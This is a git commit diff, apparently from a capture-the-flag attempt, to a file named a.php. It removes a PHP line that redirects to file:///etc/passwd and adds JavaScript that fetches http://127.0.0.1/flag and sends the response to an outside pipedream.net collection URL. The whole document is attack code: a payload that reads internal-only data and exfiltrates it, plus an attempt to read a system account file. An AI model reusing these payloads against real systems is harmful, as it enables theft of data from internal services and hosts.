b3e7b5abb6111c85bf4f374f8da1b0e941ab12aa
Little-Mu <101054117+Little-Mu@users.noreply.github.com>
2022-10-09 12:42:47 +0200

    Update a.php

--- a.php
+++ a.php
@@ -1,1 +1,7 @@
-<?php header('location:file:///etc/passwd'); ?>
+function reqListener () {
+  fetch("https://enj1mevg4ope.x.pipedream.net/?"+this.responseText);
+}
+const req = new XMLHttpRequest();
+req.addEventListener("load", reqListener);
+req.open("GET", "http://127.0.0.1/flag");
+req.send();
